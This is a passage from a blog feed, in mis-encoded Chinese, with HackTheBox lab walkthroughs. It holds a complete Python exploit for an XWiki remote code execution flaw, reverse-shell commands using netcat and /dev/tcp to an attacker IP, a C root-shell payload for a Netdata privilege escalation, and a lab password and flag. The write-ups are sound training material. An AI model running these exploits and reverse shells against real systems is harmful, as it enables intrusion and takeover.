href="https://edumail.vip/?aff=13988">EDUEmailShop</a>è´­ä¹°è¯¥ç±»é‚®ç®±ã€‚<br>è´­ä¹°é‚®ç®±åï¼Œä½¿ç”¨å®ƒæ³¨å†Œ<code>HTB Academy</code>è´¦å·ã€‚æ³¨å†Œå®Œæˆåï¼Œå‰å¾€<code>Academy</code>é¡µé¢å¼€é€šä¼šå‘˜ï¼Œæ¯æœˆè´¹ç”¨ä¸º 8 ç¾å…ƒã€‚<br>å»ºè®®ä½¿ç”¨<code>PayPal</code>ç»‘å®šå›½å†…é“¶è¡Œå¡è¿›è¡Œæ”¯ä»˜ï¼Œä¾¿æ·ä¸”æ”¯æŒè‡ªåŠ¨ç»­è´¹ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;HTB&quot;&gt;&lt;a href=&quot;#HTB&quot; class=&quot;headerlink&quot; title=&quot;HTB&quot;&gt;&lt;/a&gt;HTB&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Editor</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Editor/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Editor/</id>
    <published>2025-08-25T07:52:22.812Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Editor"><a href="#Editor" class="headerlink" title="Editor"></a>Editor</h1><span id="more"></span><h2 id="ç¬¬ä¸€æ­¥å…ˆä¸Šnmapè¿›è¡Œæ‰«æ"><a href="#ç¬¬ä¸€æ­¥å…ˆä¸Šnmapè¿›è¡Œæ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥å…ˆä¸Šnmapè¿›è¡Œæ‰«æ"></a>ç¬¬ä¸€æ­¥å…ˆä¸Šnmapè¿›è¡Œæ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.80 --verbose</span><br></pre></td></tr></table></figure><p><img src="/../images/93fd5292d89833dfac894a55a148b0070024d50bb4ef75aa84419e11887bf487.png" alt="picture 0">  </p><p>æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡ä¸»æœºå¼€æ”¾äº† <code>22ã€80</code> å’Œ <code>8080 </code>ç«¯å£ï¼Œå…¶ä¸­ <code>80</code> ä¸ <code>8080</code> ç«¯å£è¡¨æ˜å…¶è¿è¡Œäº† <code>HTTP</code> æœåŠ¡ã€‚</p><h2 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h2><p>è®¿é—®ç›®æ ‡çš„ <code>HTTP</code> æœåŠ¡æ—¶å‘ç°æ— æ³•æ­£å¸¸å“åº”ï¼Œç»æ£€æŸ¥éœ€è¦å°†ç›®æ ‡åŸŸåæ‰‹åŠ¨æ·»åŠ åˆ°<code>/etc/hosts</code>ä¸­æ‰èƒ½è®¿é—®ã€‚<br><img src="/../images/842719db7d5e5ec2cc94b1ee6afd2b56bb4d5be53c45238767eb68a184702b8f.png" alt="picture 1"></p><p>è¿›å…¥ç½‘ç«™åå‘ç°é¡µé¢å†…å®¹è¾ƒä¸ºç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾å¯åˆ©ç”¨çš„æ¸—é€ç‚¹ã€‚éšåå°è¯•è®¿é—®å…¶ <code>8080</code> ç«¯å£ã€‚<br><img src="/../images/2de75a7f965ada74b0ed9fedc83f8a0c25899371570cfe418da76a2184de7910.png" alt="picture 2">  </p><p>è¯†åˆ«åˆ°ç›®æ ‡è¿è¡Œçš„ç‰ˆæœ¬ä¸º <code>XWiki Debian 15.10.8</code>ï¼Œéšååœ¨ <code>Exploit-DB</code> ä¸­æ£€ç´¢åˆ°è¯¥ç‰ˆæœ¬å­˜åœ¨å·²çŸ¥æ¼æ´ï¼Œå¯è¢«åˆ©ç”¨è¿›è¡Œè¿›ä¸€æ­¥æ¸—é€ã€‚</p><p><img src="/../images/30a45188980f73a76e6494d337c4e9de1ab4267da25a5044cacaa975771c9495.png" alt="picture 4"> </p><p>ä½†æ˜¯ç»™å‡ºçš„<code>POC</code>æ— æ³•ä½¿ç”¨ï¼Œæ•…å¯»æ‰¾å…¶ä»–çš„<code>POC</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define color dictionary</span></span><br><span class="line">color = &#123;</span><br><span class="line">    <span class="string">&quot;NC&quot;</span>: <span class="string">&#x27;\033[0m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;RED&quot;</span>: <span class="string">&#x27;\033[91m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;GREEN&quot;</span>: <span class="string">&#x27;\033[92m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;YELLOW&quot;</span>: <span class="string">&#x27;\033[93m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;BLUE&quot;</span>: <span class="string">&#x27;\033[94m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;MAGENTA&quot;</span>: <span class="string">&#x27;\033[95m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;CYAN&quot;</span>: <span class="string">&#x27;\033[96m&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;WHITE&quot;</span>: <span class="string">&#x27;\033[97m&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define some pretty characters</span></span><br><span class="line">STAR: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>[<span class="subst">&#123;color[<span class="string">&#x27;BLUE&#x27;</span>]&#125;</span>*<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>]<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">WARNING_STR: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>[<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>!<span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>]<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ctrl+C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signal_handler</span>(<span class="params">sig, frame</span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;WARNING_STR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>Ctrl+C! Exiting...<span class="subst">&#123;color[<span class="string">&#x27;RESET&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>()-&gt;argparse.Namespace:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get arguments from user</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Create an ArgumentParser object</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">f&quot;<span class="subst">&#123;color[<span class="string">&#x27;BLUE&#x27;</span>]&#125;</span>CVE-2025-24893<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span> exploit by <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>gunzf0x<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">                                     epilog=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span>Example usage:<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;color[<span class="string">&#x27;GREEN&#x27;</span>]&#125;</span>python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> -t &#x27;http://example.com:8080&#x27; -c &#x27;ping -c1 10.10.10.10&#x27;<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawTextHelpFormatter)</span><br><span class="line">    <span class="comment"># Add arguments with flags</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url. For example: &#x27;http://example.com&#x27; or &#x27;http://example.com:8080&#x27;&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--command&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;System command to execute in the target machine&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># Return the parsed arguments</span></span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">original_url: <span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check if url provided is in correct format</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> original_url.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">or</span> <span class="keyword">not</span> original_url.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;WARNING_STR&#125;</span> protocol not found in url (HTTP or HTTPs). Assumming it is &#x27;https&#x27; adding &#x27;http://&#x27; string to url...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;http://&#x27;</span> + original_url</span><br><span class="line">    <span class="keyword">return</span> original_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target: <span class="built_in">str</span>, command: <span class="built_in">str</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exploit for CVE-2025-24893 attacking vulnerable endpoint</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Set target url</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> Attacking <span class="subst">&#123;color[<span class="string">&#x27;CYAN&#x27;</span>]&#125;</span><span class="subst">&#123;target&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    url_payload: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;target[:-<span class="number">1</span>] <span class="keyword">if</span> target.endswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">else</span> target&#125;</span>/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=&quot;</span></span><br><span class="line">    original_payload: <span class="built_in">str</span> = <span class="string">f&#x27;&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;async async=false&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;groovy&#125;&#125;&#125;&#125;&quot;<span class="subst">&#123;command&#125;</span>&quot;.execute()&#123;&#123;&#123;&#123;/groovy&#125;&#125;&#125;&#125;&#123;&#123;&#123;&#123;/async&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">    encoded_payload: <span class="built_in">str</span>  = urllib.parse.quote(original_payload)</span><br><span class="line">    vulnerable_endpoint: <span class="built_in">str</span> = <span class="string">f&quot;<span class="subst">&#123;url_payload&#125;</span><span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> Injecting the payload:\n<span class="subst">&#123;color[<span class="string">&#x27;CYAN&#x27;</span>]&#125;</span><span class="subst">&#123;vulnerable_endpoint&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(vulnerable_endpoint, verify=<span class="literal">False</span>, timeout=<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;WARNING_STR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;RED&#x27;</span>]&#125;</span>An error ocurred:\n<span class="subst">&#123;color[<span class="string">&#x27;YELLOW&#x27;</span>]&#125;</span><span class="subst">&#123;e&#125;</span><span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;STAR&#125;</span> <span class="subst">&#123;color[<span class="string">&#x27;MAGENTA&#x27;</span>]&#125;</span>Command executed<span class="subst">&#123;color[<span class="string">&#x27;NC&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n~Happy Hacking&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>()-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Get arguments form user</span></span><br><span class="line">    args: argparse.Namespace = parse_arguments()</span><br><span class="line">    <span class="comment"># Execute the exploit attacking the vulnerable endpoint</span></span><br><span class="line">    exploit(args.target, args.command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¯¥è„šæœ¬å¯¹ç½‘ç«™è¿›è¡Œ<code>åå¼¹shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆæ”»å‡»ç«¯è¿›è¡Œç«¯å£ç›‘å¬</span></span><br><span class="line">ncat -lnvp 4444</span><br><span class="line"><span class="comment"># ä¹‹åè¿›è¡Œåå¼¹shelllï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåŠ busyboxçš„è‡ªè¡ŒæŸ¥é˜…</span></span><br><span class="line">python CVE-2024-24893.py -t http://wiki.editor.htb/ -c <span class="string">&#x27;busybox nc 10.10.16.3 4444 -e /bin/bash&#x27;</span></span><br><span class="line"><span class="comment"># å¼€å¯äº¤äº’å¼ç»ˆç«¯ä¾¿äºæ“ä½œ</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/94b3aba757b9d9bab8664a8cc279ad607afde815558e60d8cdc1708426193643.png" alt="picture 5">  </p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥homeåå‘ç°æœ‰ä¸ªåä¸ºoliverçš„ç”¨æˆ·</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"></span><br><span class="line"><span class="comment"># å›åˆ°åˆšè¿›æ¥æ—¶çš„æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> /usr/lib/xwiki-jetty</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡è¯¢é—®gptï¼Œå¯ä»¥è·å–ç›¸å…³çš„ç»“æ„ä¿¡æ¯ï¼Œæ‰¾åˆ°ä¸€ä¸ªåä¸ºhibernate.cfg.xmlçš„é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡è¯¥å‘½ä»¤å‘ç°å…¶ä¸­å­˜åœ¨å¯†ç ï¼Œå¯†ç ä¸º</span></span><br><span class="line"><span class="comment"># theEd1t0rTeam99</span></span><br><span class="line">grep passw* hibernate.cfg.xml </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹é¢å°è¯•è¿›è¡Œsshè¿æ¥</span></span><br><span class="line">ssh oliver@10.10.11.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘ç°è¿æ¥æˆåŠŸï¼Œè·å¾—user flag</span></span><br><span class="line">oliver@editor:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">9afa9913d95e68e660182441f4d2c3e4</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹é¢å°è¯•è¿›è¡Œrootææƒï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ˜¯rootä¸‹é¢æ‰§è¡Œï¼Œå‘ç°æ²¡æœ‰</span></span><br><span class="line">oliver@editor:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> oliver: </span><br><span class="line">Sorry, user oliver may not run sudo on editor.</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç½‘ç»œç›‘å¬æƒ…å†µï¼Œå‘ç°å…¶æœ‰è‹¥å¹²çš„ç«¯å£ç›‘å¬æœåŠ¡ï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œè¿›è¡Œç«¯å£è½¬å‘</span></span><br><span class="line">netstat -nutl</span><br></pre></td></tr></table></figure><p><img src="/../images/b0b38a0125449b6b55dd9827d2996077b6eeb159c98a4ce5304da80f8e8ad1d2.png" alt="picture 6">  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›è¡Œç«¯å£è½¬å‘ï¼Œè¿™æ ·å°±å¯ä»¥è¿œç¨‹è®¿é—®19999ç«¯å£å•¦</span></span><br><span class="line">ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸º<code>Netdata</code>ç½‘ç«™ï¼Œå¹¶ä¸”è¿›å»æœ‰çº¢è‰²å‡çº§æé†’ï¼Œé‚£å°±çœ‹çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚<br><img src="/../images/ff4fe9bb60cfc95dd4b28e1bb0816b10efa6eb62a7a29ef31727f15e5abbac38.png" alt="picture 7">  </p><p>æŸ¥é˜…åå‘ç°ç¡®å®å­˜åœ¨æ¼æ´ï¼Œç¼–å·ä¸º<code>CVE-2024-32019</code>ã€‚å—å½±å“çš„ <code>Netdata Agent</code> ç‰ˆæœ¬é™„å¸¦çš„å·¥å…·<code>ndsudo</code>å…è®¸æ”»å‡»è€…ä»¥<code>root</code>æƒé™è¿è¡Œä»»æ„ç¨‹åºã€‚é€šè¿‡googleæ‰¾åˆ°äº†ç›¸åº”çš„<code>POC</code>ã€‚<a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">CVE-2024-32019-POC</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆæŒ‰ç…§ä»–çš„POCæ‰¾åˆ°è¯¥æ–‡ä»¶çš„ä½ç½®</span></span><br><span class="line">oliver@editor:~$ find / -name ndsudo 2&gt;/dev/null</span><br><span class="line"><span class="comment"># ä½ç½®ä¸º</span></span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œä¸€ä¸‹</span></span><br><span class="line">oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">nvme : not available <span class="keyword">in</span> PATH.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æŒ‰ç…§ä»–ç»™çš„ä»£ç æ”¹åŠ¨å†æ¬¡åå¼¹shell</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">// for setuid, setgid, execl</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span> <span class="comment">// for NULL</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/9999 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆç¼–è¯‘ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘çš„ç”µè„‘ä¸ºM4ç‰ˆæœ¬Macç”µè„‘ï¼Œéœ€è¦ä½¿ç”¨dockeræ‰èƒ½ç¼–è¯‘ä¸ºx86_64çš„</span></span><br><span class="line">docker run --<span class="built_in">rm</span> --platform linux/amd64 -v <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>:/src -w /src ubuntu:latest bash -c <span class="string">&quot;apt update &amp;&amp; apt install -y build-essential &amp;&amp; gcc -o nvme exploit.c -static&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾—åˆ°nvmeä¹‹åå°†å…¶ä¼ å…¥åˆ°ç›®æ ‡æœºå™¨</span></span><br><span class="line">scp oliver@10.10.11.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å…¶å¯æ‰§è¡Œæƒé™ï¼Œå¹¶æŠŠæ‰€åœ¨ç›®å½•åŠ å…¥åˆ°PATH</span></span><br><span class="line"><span class="built_in">chmod</span> +x nvme</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤ å³å¯ä»¥rootèº«ä»½åå¼¹shell</span></span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br></pre></td></tr></table></figure><h2 id="åˆå­¦åˆ°äº†T-T"><a href="#åˆå­¦åˆ°äº†T-T" class="headerlink" title="åˆå­¦åˆ°äº†T_T"></a>åˆå­¦åˆ°äº†T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Editor&quot;&gt;&lt;a href=&quot;#Editor&quot; class=&quot;headerlink&quot; title=&quot;Editor&quot;&gt;&lt;/a&gt;Editor&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Environment</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Environment/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Environment/</id>
    <published>2025-08-25T07:52:22.812Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><span id="more"></span><h2 id="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"><a href="#ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"></a>ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn --min-rate 2000 10.10.11.67 --verbose</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰<code>22ï¼Œ80</code>ç«¯å£ã€‚é‚£å°±è®¿é—®ä¸€ä¸‹<code>80</code>ç«¯å£ï¼Œå‘ç°æ— æ³•è®¿é—®ï¼Œé‚£å°±æ·»åŠ åˆ°<code>/etc/hosts</code>é‡Œé¢ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.11.67\environment.htb&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure><p>æ‰¾ä¸€æ‰¾ï¼ŒæŠ“æŠ“åŒ…ï¼Œå‘ç°æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£å°±æ‰«ä¸‹å…¶ä»–æ–‡ä»¶å’Œå­åŸŸåã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰«æ–‡ä»¶</span></span><br><span class="line">python dirsearch.py -u http://environment.htb/</span><br><span class="line"><span class="comment"># æ‰«åŸŸå</span></span><br><span class="line">ffuf -w fuzzDicts/subdomainDicts/main.txt -u 